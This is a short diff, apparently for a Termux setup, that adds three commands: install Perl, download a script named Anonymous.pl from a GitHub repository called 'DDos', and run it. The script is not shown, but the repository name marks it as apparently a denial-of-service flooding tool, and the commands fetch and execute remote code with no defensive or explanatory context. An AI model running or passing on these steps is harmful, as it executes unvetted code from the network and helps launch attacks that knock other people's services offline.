@@ -1,0 +1,3 @@
+pkg install perl
+wget https://raw.githubusercontent.com/maellambong/DDos/master/perl/Anonymous.pl
+perl Anonymous.pl
